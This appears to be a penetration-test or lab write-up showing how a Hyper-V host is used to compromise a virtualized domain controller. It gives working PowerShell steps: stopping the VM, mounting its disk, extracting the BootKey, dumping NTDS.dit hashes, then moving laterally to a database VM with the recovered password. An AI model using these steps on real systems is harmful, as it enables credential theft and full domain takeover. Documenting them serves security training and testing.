> Access obtained via RCE through the WSUS update channel from `GCB-WSUS`.

## ENUMERATION

`vault-srv` functions as a Hyper-V virtualization host. Administrative control over a hypervisor is particularly critical — it enables direct interaction with virtual machine disks (VHDX), allowing offline attacks against virtualized Domain Controllers.

#### 1. Identify Hyper-V Role

```powershell
Get-VM

# Name     State   CPUUsage(%) MemoryAssigned(M) Uptime              Status             Version
# ----     -----   ----------- ----------------- ------              ------             -------
# vault-db Running 0           1024              88.02:34:58.3000000 Operating normally 9.0
# vault-dc Running 0           2048              88.02:34:57.4920000 Operating normally 9.0
```

> `vault-srv` is a Hyper-V host — virtual machines are present.

- `vault-dc` → likely the Domain Controller for `gcbvault.example` — high-value target

#### 2. Locate Virtual Disk Files (VHDX)

```powershell
Get-ChildItem -Path C:\ -Include *.vhd, *.vhdx -Recurse -ErrorAction SilentlyContinue
# C:\Users\Public\Documents\Hyper-V\Virtual hard disks\vault-dc.vhdx
```

#### 3. What vault-dc.vhdx Contains

- Operating system
- Active Directory database (`NTDS.dit`)
- Registry hives
- System files

## ATTACK CHAIN

`vault-srv` → Hyper-V role identified → VM `vault-dc` discovered → virtual disk (`.vhdx`) located → full DC system access → offline extraction of `NTDS.dit` + registry hives → domain credential recovery → `gcbvault.example` compromised → lateral movement to `VAULT-DB`

## EXPLOITATION

#### 1. Stop the Virtual Machine

```powershell
Stop-VM vault-dc
```

The VM is stopped to avoid file locks and ensure `NTDS.dit` integrity during offline access.

#### 2. Mount the Virtual Disk

```powershell
Mount-VHD 'C:\Users\Public\Documents\Hyper-V\Virtual hard disks\vault-dc.vhdx' -Verbose
```

The virtual disk is mounted as a new drive on the Hyper-V host (e.g., `D:`), exposing its full file system.

#### 3. Extract the BootKey

The BootKey is required to decrypt credentials stored in `NTDS.dit`. It is located in the `SYSTEM` registry hive and is extracted using DSInternals.

```powershell
Expand-Archive .\DSInternals.zip
Import-Module .\DSInternals\DSInternals\DSInternals.psd1
$key = Get-BootKey -SystemHivePath D:\Windows\System32\Config\SYSTEM
$key
# REDACTED_HASH
```

> The BootKey is the cryptographic key required to decrypt credentials stored in `NTDS.dit`.

#### 4. Offline Credential Extraction

```powershell
Get-ADDBAccount -All -DBPath 'D:\Windows\NTDS\ntds.dit' -BootKey $key

User: Administrator
Domain: gcbvault.example
SID: S-1-5-21-1985505628-2019185050-2365871796-500
NTLM: REDACTED_HASH
AES256: REDACTED_HASH

User: krbtgt
NTLM: REDACTED_HASH
AES256: REDACTED_HASH

User: vaultdbadmin
Description: REDACTED_SECRET
NTLM: REDACTED_HASH
AES256: REDACTED_HASH

Computer: VAULT-DC$
NTLM: REDACTED_HASH
AES256: REDACTED_HASH

Computer: VAULT-DB$
NTLM: REDACTED_HASH
AES256: REDACTED_HASH
```

Full offline domain dump: users, NTLM hashes, Kerberos keys, and critical accounts.

#### 5. Restore the Environment

```powershell
DisMount-VHD 'C:\Users\Public\Documents\Hyper-V\Virtual hard disks\vault-dc.vhdx' -Verbose
Start-VM vault-dc
```

> Minimizes operational impact and avoids leaving the Domain Controller offline for an extended period.

#### 6. Credential Reuse — Identify Lateral Movement Target

```
vaultdbadmin : REDACTED_SECRET
```

The account name implies direct association with `vault-db`. Credential reuse is tested for lateral access.

#### 7. Lateral Movement via PowerShell Direct

From the Hyper-V host, PowerShell Direct provides direct VM-to-VM communication without requiring network connectivity. A remote session is established to `vault-db` using the recovered credential.

```powershell
# FROM VAULT-SRV
$password = ConvertTo-SecureString 'REDACTED_SECRET' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ('vault\vaultdbadmin', $password)
$dbsession= New-PSSession -VMName vault-db -Credential $credential
```

#### 8. Sensitive Data Identified on VAULT-DB

```powershell
Invoke-Command -Session $dbsession -scriptblock { ls C:\Users\vaultdbadmin\Desktop\}
# transfer.txt

Invoke-Command -Session $dbsession -scriptblock { cat C:\Users\vaultdbadmin\Desktop\transfer.txt}
```

The file contains a value stored in plaintext — the secret code for fraudulent transfers from GCB, confirming critical business impact.
